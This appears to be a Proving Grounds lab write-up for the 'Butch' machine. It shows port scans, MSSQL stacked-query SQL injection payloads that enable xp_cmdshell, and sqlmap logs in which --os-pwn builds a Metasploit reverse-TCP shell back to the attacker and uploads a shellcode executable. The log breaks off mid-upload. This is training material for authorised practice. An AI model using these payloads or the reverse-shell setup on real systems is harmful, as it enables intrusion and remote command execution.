# Butch

# Enumeration

## nmap

```
# Nmap 7.91 scan initiated Thu Jan 27 11:38:49 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Butch/results/192.168.193.63/scans/_full_tcp_nmap.txt" -oX "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Butch/results/192.168.193.63/scans/xml/_full_tcp_nmap.xml" 192.168.193.63
Nmap scan report for 192.168.193.63
Host is up, received user-set (0.20s latency).
Scanned at 2022-01-27 11:38:51 EST for 359s
Not shown: 65529 filtered ports
Reason: 65529 no-responses
PORT     STATE SERVICE       REASON          VERSION
21/tcp   open  ftp           syn-ack ttl 127 Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
25/tcp   open  smtp          syn-ack ttl 127 Microsoft ESMTP 10.0.17763.1
| smtp-commands: butch Hello [192.168.49.193], TURN, SIZE 2097152, ETRN, PIPELINING, DSN, ENHANCEDSTATUSCODES, 8bitmime, BINARYMIME, CHUNKING, VRFY, OK, 
|_ This server supports the following commands: HELO EHLO STARTTLS RCPT DATA RSET MAIL QUIT HELP AUTH TURN ETRN BDAT VRFY 
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds? syn-ack ttl 127
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=1/27%OT=21%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=61F2CC02%P=x86_64-pc-linux-gnu)
SEQ(SP=102%GCD=1%ISR=10E%TI=I%II=I%SS=S%TS=U)
OPS(O1=M54ENW8NNS%O2=M54ENW8NNS%O3=M54ENW8%O4=M54ENW8NNS%O5=M54ENW8NNS%O6=M54ENNS)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M54ENW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: butch; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1m15s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 56406/tcp): CLEAN (Timeout)
|   Check 2 (port 31984/tcp): CLEAN (Timeout)
|   Check 3 (port 21820/udp): CLEAN (Timeout)
|   Check 4 (port 38892/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-01-27T16:42:55
|_  start_date: N/A

TRACEROUTE (using port 25/tcp)
HOP RTT       ADDRESS
1   209.51 ms 192.168.49.1
2   209.52 ms 192.168.193.63

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jan 27 11:44:50 2022 -- 1 IP address (1 host up) scanned in 361.64 seconds

```

```
┌──(kali㉿kali)-[/tmp]
└─$ sudo nmap -p 21,135,139,445,5985 192.168.193.63 --script vuln
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-27 18:57 EST
Nmap scan report for 192.168.193.63
Host is up (0.19s latency).

PORT     STATE SERVICE
21/tcp   open  ftp
|_sslv2-drown: 
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
5985/tcp open  wsman

Host script results:
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR

Nmap done: 1 IP address (1 host up) scanned in 33.02 seconds
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 

```

```
┌──(kali㉿kali)-[/media/…/ftpfiles/192.168.90.114/forum/config]
└─$ rustscan -a 192.168.70.63     
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 192.168.70.63:21
Open 192.168.70.63:25
Open 192.168.70.63:135
Open 192.168.70.63:139
Open 192.168.70.63:445
Open 192.168.70.63:450
Open 192.168.70.63:5985


```

## 21 - FTP

```
┌──(kali㉿kali)-[/tmp]
└─$ ftp 192.168.193.63 
Connected to 192.168.193.63.
220 Microsoft FTP Service
Name (192.168.193.63:kali): anonymous
331 Password required
Password:
530 User cannot log in.
Login failed.
Remote system type is Windows_NT.
ftp> exit
221 Goodbye.

```

Failed credentials

```
anonymous:
admin:admin
admin:password
guest:guest
backup:backup
```


## 450  - Web
![](Pasted%20image%2020220215090130.png)


## SQL injection
![](Pasted%20image%2020220215090314.png)
![](Pasted%20image%2020220215090206.png)

# Exploitation

## SQL Injection CMD

`admin';  WAITFOR DELAY '0:0:5' -- - ` -> Has a Delay, can use stopwatch to estimate

Allows for stacked SQL Queries

https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet

```
admin'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;EXEC xp_cmdshell ''; --
```


```
admin'; EXEC sp_configure 'show advanced options', '1'; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;WAITFOR DELAY '0:0:5'; EXEC xp_cmdshell 'whoami'; WAITFOR DELAY '0:0:5'; --
```

```
┌──(kali㉿kali)-[~]
└─$ sqlmap --forms --crawl=2 -u http://192.168.70.63:450/
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.5.2#stable}
|_ -| . [(]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:34:46 /2022-02-14/

do you want to check for the existence of site's sitemap(.xml) [y/N] 
[20:34:47] [INFO] starting crawler for target URL 'http://192.168.70.63:450/'
[20:34:47] [INFO] searching for links with depth 1
[20:34:48] [INFO] searching for links with depth 2                                                                                                                     
please enter number of threads? [Enter for 1 (current)] 
[20:34:49] [WARNING] running in a single-thread mode. This could take a while
do you want to normalize crawling results [Y/n]                                                                                                                        
do you want to store crawling results to a temporary file for eventual further processing with other tools [y/N] 
[#1] form:
POST http://192.168.70.63:450/
POST data: __VIEWSTATE=%2FwEPDwUKLTQ0NDEwMDQ5MmRksS3kT9xVa5WcaOExJczybgwm5ag61c1aSJauWk%2BMueM%3D&__VIEWSTATEGENERATOR=CA0B0334&__EVENTVALIDATION=%2FwEdAAQlk%2FdmKT4Sorxxd%2FxByuYXG8sL8VA5%2Fm7gZ949JdB2tEE%2BRwHRw9AX2%2FIZO4gVaaKVeG6rrLts0M7XT7lmdcb6cSWj1jCV5XpbYX8jTlKxWkDqoWst7QvUmEJo%2BjB%2FFoQ%3D&ctl00$ContentPlaceHolder1$UsernameTextBox=&ctl00$ContentPlaceHolder1$PasswordTextBox=&ctl00$ContentPlaceHolder1$LoginButton=Enter
do you want to test this form? [Y/n/q] 
> 
Edit POST data [default: __VIEWSTATE=%2FwEPDwUKLTQ0NDEwMDQ5MmRksS3kT9xVa5WcaOExJczybgwm5ag61c1aSJauWk%2BMueM%3D&__VIEWSTATEGENERATOR=CA0B0334&__EVENTVALIDATION=%2FwEdAAQlk%2FdmKT4Sorxxd%2FxByuYXG8sL8VA5%2Fm7gZ949JdB2tEE%2BRwHRw9AX2%2FIZO4gVaaKVeG6rrLts0M7XT7lmdcb6cSWj1jCV5XpbYX8jTlKxWkDqoWst7QvUmEJo%2BjB%2FFoQ%3D&ctl00$ContentPlaceHolder1$UsernameTextBox=&ctl00$ContentPlaceHolder1$PasswordTextBox=&ctl00$ContentPlaceHolder1$LoginButton=Enter] (Warning: blank fields detected): 
do you want to fill blank fields with random values? [Y/n] 
[20:35:00] [INFO] using '/home/kali/.local/share/sqlmap/output/results-02142022_0835pm.csv' as the CSV results file in multiple targets mode
do you want to automatically adjust the value of '__EVENTVALIDATION'? [y/N] 
do you want to automatically adjust the value of '__VIEWSTATE'? [y/N] 
[20:35:02] [INFO] checking if the target is protected by some kind of WAF/IPS
[20:35:02] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS
are you sure that you want to continue with further target testing? [Y/n] 
[20:35:04] [WARNING] please consider usage of tamper scripts (option '--tamper')
[20:35:04] [INFO] testing if the target URL content is stable
[20:35:04] [INFO] target URL content is stable
[20:35:04] [INFO] ignoring POST parameter '__VIEWSTATE'
[20:35:04] [INFO] ignoring POST parameter '__VIEWSTATEGENERATOR'
[20:35:04] [INFO] ignoring POST parameter '__EVENTVALIDATION'
[20:35:04] [INFO] testing if POST parameter 'ctl00$ContentPlaceHolder1$UsernameTextBox' is dynamic
[20:35:05] [WARNING] POST parameter 'ctl00$ContentPlaceHolder1$UsernameTextBox' does not appear to be dynamic
[20:35:05] [INFO] heuristic (basic) test shows that POST parameter 'ctl00$ContentPlaceHolder1$UsernameTextBox' might be injectable (possible DBMS: 'Microsoft SQL Server')
[20:35:05] [INFO] testing for SQL injection on POST parameter 'ctl00$ContentPlaceHolder1$UsernameTextBox'
it looks like the back-end DBMS is 'Microsoft SQL Server'. Do you want to skip test payloads specific for other DBMSes? [Y/n] 
for the remaining tests, do you want to include all tests for 'Microsoft SQL Server' extending provided level (1) and risk (1) values? [Y/n] 
[20:35:11] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[20:35:11] [WARNING] reflective value(s) found and filtering out
[20:35:13] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[20:35:13] [INFO] testing 'Generic inline queries'
[20:35:13] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
[20:35:14] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
[20:35:14] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
[20:35:15] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
[20:35:16] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
[20:35:25] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
[20:35:35] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[20:35:46] [INFO] testing 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (IN)'
[20:35:54] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONVERT)'
[20:36:04] [INFO] testing 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONVERT)'
[20:36:13] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONCAT)'
[20:36:23] [INFO] testing 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONCAT)'
[20:36:31] [INFO] testing 'Microsoft SQL Server/Sybase error-based - Parameter replace'
[20:36:31] [INFO] testing 'Microsoft SQL Server/Sybase error-based - Parameter replace (integer column)'
[20:36:31] [INFO] testing 'Microsoft SQL Server/Sybase error-based - ORDER BY clause'
[20:36:32] [INFO] testing 'Microsoft SQL Server/Sybase error-based - Stacking (EXEC)'
[20:36:37] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
[20:36:37] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[20:36:48] [INFO] POST parameter 'ctl00$ContentPlaceHolder1$UsernameTextBox' appears to be 'Microsoft SQL Server/Sybase stacked queries (comment)' injectable 
[20:36:48] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[20:36:58] [INFO] POST parameter 'ctl00$ContentPlaceHolder1$UsernameTextBox' appears to be 'Microsoft SQL Server/Sybase time-based blind (IF)' injectable 
[20:36:58] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[20:36:58] [INFO] checking if the injection point on POST parameter 'ctl00$ContentPlaceHolder1$UsernameTextBox' is a false positive
POST parameter 'ctl00$ContentPlaceHolder1$UsernameTextBox' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
sqlmap identified the following injection point(s) with a total of 450 HTTP(s) requests:
---
Parameter: ctl00$ContentPlaceHolder1$UsernameTextBox (POST)
    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries (comment)
    Payload: __VIEWSTATE=/wEPDwUKLTQ0NDEwMDQ5MmRksS3kT9xVa5WcaOExJczybgwm5ag61c1aSJauWk+MueM=&__VIEWSTATEGENERATOR=CA0B0334&__EVENTVALIDATION=/wEdAAQlk/dmKT4Sorxxd/xByuYXG8sL8VA5/m7gZ949JdB2tEE+RwHRw9AX2/IZO4gVaaKVeG6rrLts0M7XT7lmdcb6cSWj1jCV5XpbYX8jTlKxWkDqoWst7QvUmEJo+jB/FoQ=&ctl00$ContentPlaceHolder1$UsernameTextBox=';WAITFOR DELAY '0:0:5'--&ctl00$ContentPlaceHolder1$PasswordTextBox=&ctl00$ContentPlaceHolder1$LoginButton=Enter

    Type: time-based blind
    Title: Microsoft SQL Server/Sybase time-based blind (IF)
    Payload: __VIEWSTATE=/wEPDwUKLTQ0NDEwMDQ5MmRksS3kT9xVa5WcaOExJczybgwm5ag61c1aSJauWk+MueM=&__VIEWSTATEGENERATOR=CA0B0334&__EVENTVALIDATION=/wEdAAQlk/dmKT4Sorxxd/xByuYXG8sL8VA5/m7gZ949JdB2tEE+RwHRw9AX2/IZO4gVaaKVeG6rrLts0M7XT7lmdcb6cSWj1jCV5XpbYX8jTlKxWkDqoWst7QvUmEJo+jB/FoQ=&ctl00$ContentPlaceHolder1$UsernameTextBox=' WAITFOR DELAY '0:0:5'-- vwgQ&ctl00$ContentPlaceHolder1$PasswordTextBox=&ctl00$ContentPlaceHolder1$LoginButton=Enter
---
do you want to exploit this SQL injection? [Y/n] 
[20:44:43] [INFO] testing Microsoft SQL Server
[20:44:43] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
[20:44:43] [WARNING] turning off pre-connect mechanism because of connection reset(s)
[20:44:43] [CRITICAL] connection reset to the target URL. sqlmap is going to retry the request(s)
[20:54:17] [INFO] confirming Microsoft SQL Serverr DBMS delay responses (option '--time-sec')? [Y/n] 
[20:54:23] [INFO] the back-end DBMS is Microsoft SQL Server
web server operating system: Windows 10 or 2019 or 2016
web application technology: ASP.NET 4.0.30319, Microsoft IIS 10.0, ASP.NET
back-end DBMS: Microsoft SQL Server 2017
[20:54:23] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 1 times
[20:54:23] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/.local/share/sqlmap/output/results-02142022_0835pm.csv'
[20:54:23] [WARNING] your sqlmap version is outdated

[*] ending @ 20:54:23 /2022-02-14/

                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ sqlmap --forms --crawl=2 -u http://192.168.70.63:450/ --os-shell
        ___
       __H__                                                                                                                                                            
 ___ ___[)]_____ ___ ___  {1.5.2#stable}                                                                                                                                
|_ -| . ["]     | .'| . |                                                                                                                                               
|___|_  [,]_|_|_|__,|  _|                                                                                                                                               
      |_|V...       |_|   http://sqlmap.org                                                                                                                             

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:21:27 /2022-02-14/

do you want to check for the existence of site's sitemap(.xml) [y/N] 
[21:21:28] [INFO] starting crawler for target URL 'http://192.168.70.63:450/'
[21:21:28] [INFO] searching for links with depth 1
[21:21:29] [INFO] searching for links with depth 2                                                                                                                     
please enter number of threads? [Enter for 1 (current)] 
[21:21:29] [WARNING] running in a single-thread mode. This could take a while
do you want to normalize crawling results [Y/n]                                                                                                                        
do you want to store crawling results to a temporary file for eventual further processing with other tools [y/N] 
[#1] form:
POST http://192.168.70.63:450/
POST data: __VIEWSTATE=%2FwEPDwUKLTQ0NDEwMDQ5MmRksS3kT9xVa5WcaOExJczybgwm5ag61c1aSJauWk%2BMueM%3D&__VIEWSTATEGENERATOR=CA0B0334&__EVENTVALIDATION=%2FwEdAAQlk%2FdmKT4Sorxxd%2FxByuYXG8sL8VA5%2Fm7gZ949JdB2tEE%2BRwHRw9AX2%2FIZO4gVaaKVeG6rrLts0M7XT7lmdcb6cSWj1jCV5XpbYX8jTlKxWkDqoWst7QvUmEJo%2BjB%2FFoQ%3D&ctl00$ContentPlaceHolder1$UsernameTextBox=&ctl00$ContentPlaceHolder1$PasswordTextBox=&ctl00$ContentPlaceHolder1$LoginButton=Enter
do you want to test this form? [Y/n/q] 
> 
Edit POST data [default: __VIEWSTATE=%2FwEPDwUKLTQ0NDEwMDQ5MmRksS3kT9xVa5WcaOExJczybgwm5ag61c1aSJauWk%2BMueM%3D&__VIEWSTATEGENERATOR=CA0B0334&__EVENTVALIDATION=%2FwEdAAQlk%2FdmKT4Sorxxd%2FxByuYXG8sL8VA5%2Fm7gZ949JdB2tEE%2BRwHRw9AX2%2FIZO4gVaaKVeG6rrLts0M7XT7lmdcb6cSWj1jCV5XpbYX8jTlKxWkDqoWst7QvUmEJo%2BjB%2FFoQ%3D&ctl00$ContentPlaceHolder1$UsernameTextBox=&ctl00$ContentPlaceHolder1$PasswordTextBox=&ctl00$ContentPlaceHolder1$LoginButton=Enter] (Warning: blank fields detected): 
do you want to fill blank fields with random values? [Y/n] 
[21:21:33] [INFO] resuming back-end DBMS 'microsoft sql server' 
[21:21:33] [INFO] using '/home/kali/.local/share/sqlmap/output/results-02142022_0921pm.csv' as the CSV results file in multiple targets mode
do you want to automatically adjust the value of '__EVENTVALIDATION'? [y/N] 
do you want to automatically adjust the value of '__VIEWSTATE'? [y/N] 
[21:21:35] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: ctl00$ContentPlaceHolder1$UsernameTextBox (POST)
    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries (comment)
    Payload: __VIEWSTATE=/wEPDwUKLTQ0NDEwMDQ5MmRksS3kT9xVa5WcaOExJczybgwm5ag61c1aSJauWk+MueM=&__VIEWSTATEGENERATOR=CA0B0334&__EVENTVALIDATION=/wEdAAQlk/dmKT4Sorxxd/xByuYXG8sL8VA5/m7gZ949JdB2tEE+RwHRw9AX2/IZO4gVaaKVeG6rrLts0M7XT7lmdcb6cSWj1jCV5XpbYX8jTlKxWkDqoWst7QvUmEJo+jB/FoQ=&ctl00$ContentPlaceHolder1$UsernameTextBox=';WAITFOR DELAY '0:0:5'--&ctl00$ContentPlaceHolder1$PasswordTextBox=&ctl00$ContentPlaceHolder1$LoginButton=Enter

    Type: time-based blind
    Title: Microsoft SQL Server/Sybase time-based blind (IF)
    Payload: __VIEWSTATE=/wEPDwUKLTQ0NDEwMDQ5MmRksS3kT9xVa5WcaOExJczybgwm5ag61c1aSJauWk+MueM=&__VIEWSTATEGENERATOR=CA0B0334&__EVENTVALIDATION=/wEdAAQlk/dmKT4Sorxxd/xByuYXG8sL8VA5/m7gZ949JdB2tEE+RwHRw9AX2/IZO4gVaaKVeG6rrLts0M7XT7lmdcb6cSWj1jCV5XpbYX8jTlKxWkDqoWst7QvUmEJo+jB/FoQ=&ctl00$ContentPlaceHolder1$UsernameTextBox=' WAITFOR DELAY '0:0:5'-- vwgQ&ctl00$ContentPlaceHolder1$PasswordTextBox=&ctl00$ContentPlaceHolder1$LoginButton=Enter
---
do you want to exploit this SQL injection? [Y/n] 
[21:21:35] [INFO] the back-end DBMS is Microsoft SQL Server
web server operating system: Windows 2019 or 2016 or 10
web application technology: ASP.NET 4.0.30319, ASP.NET, Microsoft IIS 10.0
back-end DBMS: Microsoft SQL Server 2017
[21:21:35] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                                         
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] 
[21:21:51] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
C
[21:22:03] [INFO] adjusting time delay to 2 seconds due to good response times
:\Program Files\Microsoft SQL Server\
[21:27:20] [ERROR] invalid character detected. retrying..
[21:27:20] [WARNING] increasing time delay to 3 seconds
MSSQL14.SQLEXPRESS\MSSQL\Log\ERRORLOG
[21:34:45] [INFO] testing if current user is DBA
[21:34:45] [WARNING] functionality requested probably does not work because the current session user is not a database administrator. You can try to use option '--dbms-cred' to execute statements as a DBA user if you were able to extract and crack a DBA password by any mean                                                              
[21:34:45] [INFO] checking if xp_cmdshell extended procedure is available, please wait..
[21:34:45] [WARNING] reflective value(s) found and filtering out
xp_cmdshell extended procedure does not seem to be available. Do you want sqlmap to try to re-enable it? [Y/n] 
[21:37:13] [WARNING] turning off pre-connect mechanism because of connection reset(s)
[21:37:13] [CRITICAL] connection reset to the target URL. sqlmap is going to retry the request(s)
[21:37:13] [WARNING] xp_cmdshell re-enabling failed
[21:37:13] [INFO] creating xp_cmdshell with sp_OACreate
[21:37:15] [WARNING] xp_cmdshell creation failed, probably because sp_OACreate is disabled
[21:37:15] [ERROR] unable to proceed without xp_cmdshell, skipping to the next form
[21:37:15] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/.local/share/sqlmap/output/results-02142022_0921pm.csv'
[21:37:15] [WARNING] your sqlmap version is outdated

[*] ending @ 21:37:15 /2022-02-14/

                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ sqlmap --forms --crawl=2 -u http://192.168.70.63:450/ --os-pwn  
        ___
       __H__                                                                                                                                                            
 ___ ___[.]_____ ___ ___  {1.5.2#stable}                                                                                                                                
|_ -| . [)]     | .'| . |                                                                                                                                               
|___|_  [(]_|_|_|__,|  _|                                                                                                                                               
      |_|V...       |_|   http://sqlmap.org                                                                                                                             

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:37:26 /2022-02-14/

do you want to check for the existence of site's sitemap(.xml) [y/N] 
[21:37:27] [INFO] starting crawler for target URL 'http://192.168.70.63:450/'
[21:37:27] [INFO] searching for links with depth 1

[21:37:27] [INFO] searching for links with depth 2                                                                                                                     
please enter number of threads? [Enter for 1 (current)] 
[21:37:27] [WARNING] running in a single-thread mode. This could take a while
do you want to normalize crawling results [Y/n]                                                                                                                        
do you want to store crawling results to a temporary file for eventual further processing with other tools [y/N] 
[21:37:29] [WARNING] you did not provide the local path where Metasploit Framework is installed
[21:37:29] [WARNING] sqlmap is going to look for Metasploit Framework installation inside the environment path(s)
[21:37:29] [INFO] Metasploit Framework has been found installed in the '/usr/bin' path
[#1] form:
POST http://192.168.70.63:450/
POST data: __VIEWSTATE=%2FwEPDwUKLTQ0NDEwMDQ5MmRksS3kT9xVa5WcaOExJczybgwm5ag61c1aSJauWk%2BMueM%3D&__VIEWSTATEGENERATOR=CA0B0334&__EVENTVALIDATION=%2FwEdAAQlk%2FdmKT4Sorxxd%2FxByuYXG8sL8VA5%2Fm7gZ949JdB2tEE%2BRwHRw9AX2%2FIZO4gVaaKVeG6rrLts0M7XT7lmdcb6cSWj1jCV5XpbYX8jTlKxWkDqoWst7QvUmEJo%2BjB%2FFoQ%3D&ctl00$ContentPlaceHolder1$UsernameTextBox=&ctl00$ContentPlaceHolder1$PasswordTextBox=&ctl00$ContentPlaceHolder1$LoginButton=Enter
do you want to test this form? [Y/n/q] 
> 
Edit POST data [default: __VIEWSTATE=%2FwEPDwUKLTQ0NDEwMDQ5MmRksS3kT9xVa5WcaOExJczybgwm5ag61c1aSJauWk%2BMueM%3D&__VIEWSTATEGENERATOR=CA0B0334&__EVENTVALIDATION=%2FwEdAAQlk%2FdmKT4Sorxxd%2FxByuYXG8sL8VA5%2Fm7gZ949JdB2tEE%2BRwHRw9AX2%2FIZO4gVaaKVeG6rrLts0M7XT7lmdcb6cSWj1jCV5XpbYX8jTlKxWkDqoWst7QvUmEJo%2BjB%2FFoQ%3D&ctl00$ContentPlaceHolder1$UsernameTextBox=&ctl00$ContentPlaceHolder1$PasswordTextBox=&ctl00$ContentPlaceHolder1$LoginButton=Enter] (Warning: blank fields detected): 
do you want to fill blank fields with random values? [Y/n] 
[21:37:31] [INFO] resuming back-end DBMS 'microsoft sql server' 
[21:37:31] [INFO] using '/home/kali/.local/share/sqlmap/output/results-02142022_0937pm.csv' as the CSV results file in multiple targets mode
do you want to automatically adjust the value of '__EVENTVALIDATION'? [y/N] 
do you want to automatically adjust the value of '__VIEWSTATE'? [y/N] 
[21:37:32] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: ctl00$ContentPlaceHolder1$UsernameTextBox (POST)
    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries (comment)
    Payload: __VIEWSTATE=/wEPDwUKLTQ0NDEwMDQ5MmRksS3kT9xVa5WcaOExJczybgwm5ag61c1aSJauWk+MueM=&__VIEWSTATEGENERATOR=CA0B0334&__EVENTVALIDATION=/wEdAAQlk/dmKT4Sorxxd/xByuYXG8sL8VA5/m7gZ949JdB2tEE+RwHRw9AX2/IZO4gVaaKVeG6rrLts0M7XT7lmdcb6cSWj1jCV5XpbYX8jTlKxWkDqoWst7QvUmEJo+jB/FoQ=&ctl00$ContentPlaceHolder1$UsernameTextBox=';WAITFOR DELAY '0:0:5'--&ctl00$ContentPlaceHolder1$PasswordTextBox=&ctl00$ContentPlaceHolder1$LoginButton=Enter

    Type: time-based blind
    Title: Microsoft SQL Server/Sybase time-based blind (IF)
    Payload: __VIEWSTATE=/wEPDwUKLTQ0NDEwMDQ5MmRksS3kT9xVa5WcaOExJczybgwm5ag61c1aSJauWk+MueM=&__VIEWSTATEGENERATOR=CA0B0334&__EVENTVALIDATION=/wEdAAQlk/dmKT4Sorxxd/xByuYXG8sL8VA5/m7gZ949JdB2tEE+RwHRw9AX2/IZO4gVaaKVeG6rrLts0M7XT7lmdcb6cSWj1jCV5XpbYX8jTlKxWkDqoWst7QvUmEJo+jB/FoQ=&ctl00$ContentPlaceHolder1$UsernameTextBox=' WAITFOR DELAY '0:0:5'-- vwgQ&ctl00$ContentPlaceHolder1$PasswordTextBox=&ctl00$ContentPlaceHolder1$LoginButton=Enter
---
do you want to exploit this SQL injection? [Y/n] 
[21:37:33] [INFO] the back-end DBMS is Microsoft SQL Server
web server operating system: Windows 2016 or 2019 or 10
web application technology: ASP.NET, Microsoft IIS 10.0, ASP.NET 4.0.30319
back-end DBMS: Microsoft SQL Server 2017
how do you want to establish the tunnel?
[1] TCP: Metasploit Framework (default)
[2] ICMP: icmpsh - ICMP tunneling
> 
[21:37:35] [INFO] testing if current user is DBA
[21:37:35] [WARNING] functionality requested probably does not work because the current session user is not a database administrator. You can try to use option '--dbms-cred' to execute statements as a DBA user if you were able to extract and crack a DBA password by any mean                                                              
[21:37:35] [WARNING] reflective value(s) found and filtering out
[21:37:36] [INFO] testing if xp_cmdshell extended procedure is usable
[21:37:44] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] 
[21:38:15] [ERROR] unable to retrieve xp_cmdshell output
[21:38:15] [INFO] creating Metasploit Framework multi-stage shellcode 
which connection type do you want to use?
[1] Reverse TCP: Connect back from the database host to this machine (default)
[2] Reverse TCP: Try to connect back from the database host to this machine, on all ports between the specified and 65535
[3] Reverse HTTP: Connect back from the database host to this machine tunnelling traffic over HTTP
[4] Reverse HTTPS: Connect back from the database host to this machine tunnelling traffic over HTTPS
[5] Bind TCP: Listen on the database host for a connection
> 
what is the local address? [Enter for '192.168.49.70' (detected)] 
which local port number do you want to use? [25471] 450
which payload do you want to use?
[1] Meterpreter (default)
[2] Shell
[3] VNC
> 2
[21:38:37] [INFO] creation in progress .................... done
[21:38:57] [INFO] uploading shellcodeexec to 'C:/Program Files/Microsoft SQL Server/MSSQL14.SQLEXPRESS/MSSQL/Log/tmpseellk.exe'
